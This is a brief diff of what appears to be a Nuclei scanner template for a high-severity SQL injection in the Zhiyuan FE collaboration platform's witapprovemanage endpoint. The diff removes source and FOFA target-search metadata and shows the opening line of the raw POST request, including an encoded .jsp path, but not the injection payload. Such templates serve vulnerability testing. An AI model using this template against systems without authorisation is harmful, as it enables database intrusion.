@@ -3,12 +3,8 @@ info:
   name: 致远互联FE协作办公平台witapprovemanage接口存在sql注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pnszzdo16bvtynfa'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pnszzdo16bvtynfa
-    fofa: app="致远互联-FE" || body="li_plugins_download"
 http:
 - raw:
   - 'POST /witapprovemanage/apprvaddNew.j%73p HTTP/1.1
